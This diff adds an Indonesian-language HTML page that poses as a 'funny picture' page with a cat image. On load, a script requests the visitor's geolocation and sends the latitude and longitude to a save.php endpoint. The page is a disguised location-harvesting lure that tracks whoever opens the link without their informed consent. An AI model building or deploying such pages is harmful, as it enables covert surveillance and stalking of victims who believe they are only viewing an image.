@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Gambar Lucu</title>
+</head>
+<body>
+  <h2>Sedang memuat gambar...</h2>
+  <script>
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        fetch("save.php?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
+      },
+      function(error) {
+        alert("Izin lokasi tidak diberikan.");
+      }
+    );
+  </script>
+
+  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a3/June_odd-eyed-cat.jpg" width="300">
+</body>
+</html>
